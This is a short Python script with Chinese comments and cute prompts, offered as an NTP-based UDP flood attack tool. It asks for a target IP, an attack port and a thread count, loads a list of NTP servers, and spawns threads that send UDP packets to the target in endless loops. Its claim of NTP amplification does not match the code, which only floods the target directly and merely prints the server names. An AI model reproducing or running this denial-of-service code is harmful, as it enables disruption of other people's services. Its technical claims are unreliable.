import socket
import threading
import time
def udp_flood(target_ip, target_port, ntp_server):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)        
    bytes_to_send = b"\\x08\\x00\\x06\\x23\\x00\\x00\\x00\\x00"  # NTP request packet (simplified) 
    while True: # 保持持续发送
        print(f"准备发送数据包,NTP 服务器: {ntp_server}")
        try:
            sock.sendto(bytes_to_send, (target_ip, target_port))
            print(f"从 {ntp_server} 向 {target_ip}:{target_port} 发送数据包!")
        except Exception as e:
            print(f"发送数据包时出错啦：{e} (ノω；),NTP 服务器: {ntp_server}")
def main():    
    target_ip = input("输入目标IP地址:")        # 你的目标IP地址
    target_port = int(input("输入攻击端口:"))   # 你要攻击的端口 (例如web服务的80端口)    
    ntp_servers_file = "ntp_servers.txt"       # 你的ntp服务器IP列表文件    
    num_threads = int(input("输入线程数量:"))   # 可以根据需要调整线程数量    
    try:
        with open(ntp_servers_file, 'r') as f:
            ntp_servers = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"找不到 {ntp_servers_file} 文件呢！(；ω；｀)")
        return
    print("读取到的 NTP 服务器列表: ", ntp_servers)
    time.sleep(3)
    print("开始运行")    
    threads = []    
    for i in range(min(num_threads, len(ntp_servers))):
        ntp_server = ntp_servers[i]
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, ntp_server))
        threads.append(thread)
        thread.start()
    print("启动了",len(threads),"个线程")
    try:        
        while True:            
            pass    
    except KeyboardInterrupt:        
        print("停止脚本啦! ( ´ ▽  )ﾉ")
if __name__=="__main__": 
    main()